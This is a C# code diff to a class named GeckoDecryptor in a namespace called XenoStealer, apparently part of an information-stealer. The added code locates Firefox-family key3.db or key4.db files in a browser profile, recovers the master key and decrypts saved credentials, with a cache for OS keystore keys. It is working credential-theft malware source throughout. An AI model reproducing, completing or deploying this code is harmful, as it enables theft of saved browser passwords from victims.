@@ -14,6 +14,79 @@ namespace XenoStealer
 {
     public class GeckoDecryptor
     {
+        private static Dictionary<string, byte[]> osKeyStore = new Dictionary<string, byte[]>();
+
+
+
+        public bool operational = false;
+        private byte[] masterKey = null;
+
+        public GeckoDecryptor(string profilePath) 
+        {
+            string key3Path = Path.Combine(profilePath, "key3.db");
+            string key4Path = Path.Combine(profilePath, "key4.db");
+            if (File.Exists(key3Path))
+            {
+                masterKey = GetMasterKeyFromKey3(key3Path);
+            }
+            else if (File.Exists(key4Path))
+            {
+                masterKey = GetMasterKeyFromKey4(key4Path);
+            }
+            else
+            {
+                return;
+            }
+            operational = masterKey != null;
+        }
+
+        public string Decrypt(byte[] EncryptedData) 
+        {
+            if (!operational) 
+            {
+                throw new Exception("this interface is non-operational!");
+            }
+
+            ASN1DERObject asn = ASN1DER.Parse(EncryptedData);
+
+            byte[] IV = asn.objects?[0].objects?[1].objects?[1].data;
+            byte[] cipherData = asn.objects?[0].objects?[2].data;
+
+            if (IV == null || cipherData == null)
+            {
+                return null;
+            }
+
+            string decryptedData = TripleDES.DecryptStringDesCbc(masterKey, IV, cipherData);
+
+            if (decryptedData == null)
+            {
+                return null;
+            }
+
+            return Regex.Replace(decryptedData, "[^\u0020-\u007F]", "");
+        }
+
+
+        public string DecryptBase64(string cypherText)
+        {
+            if (cypherText == null)
+            {
+                return null;
+            }
+
+            byte[] b64Decode;
+            try
+            {
+                b64Decode = Convert.FromBase64String(cypherText);
+            }
+            catch
+            {
+                return null;
+            }
+
+            return Decrypt(b64Decode);
+        }
 
         public static string Decrypt(string profilePath, byte[] EncryptedData) 
         {
@@ -29,6 +102,11 @@ namespace XenoStealer
                 masterKey = GetMasterKeyFromKey4(key4Path);
             }
             else 
+            {
+                return null;
+            }
+
+            if (masterKey == null) 
             {
                 return null;
             }
@@ -393,9 +471,20 @@ namespace XenoStealer
 
         public static byte[] OsKeyStoreDecrypt(string MOZAPPBASENAME, byte[] EncryptedData) 
         {
-            byte[] key = GetOsKeyStoreKey(MOZAPPBASENAME);
+            byte[] key;
+            if (osKeyStore.ContainsKey(MOZAPPBASENAME))
+            {
+                key = osKeyStore[MOZAPPBASENAME];
+            }
+            else 
+            {
+                key = GetOsKeyStoreKey(MOZAPPBASENAME);
+                osKeyStore[MOZAPPBASENAME] = key;
+            }
+             
             if (key == null) 
             {
+                osKeyStore.Remove(MOZAPPBASENAME);
                 return null;
             }
 
